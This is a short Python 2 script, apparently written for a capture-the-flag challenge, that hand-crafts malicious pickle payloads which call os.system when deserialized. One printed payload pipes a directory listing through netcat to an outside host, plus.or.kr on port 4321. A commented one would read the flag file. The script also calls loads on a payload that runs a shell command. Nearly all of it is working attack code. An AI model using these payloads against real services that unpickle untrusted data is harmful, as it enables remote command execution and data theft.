from pickle import dumps, load, dump, loads


#print "cos\nsystem\n(S'cat flag ~'\ntR.#"
print "cos\nsystem\n(S'ls | nc plus.or.kr 4321'\ntR.#"

st = b"cos\nsystem\n(S'touch asdf'\ntR."
loads(st)

'''
print dumps([1, 2, 3, 4])+'#'

f = open('flag', 'wb')
st = 'thisisflag'
dump(st,f)
f.close()
 
ff = open('flag', 'r')

s = load(ff)
'''
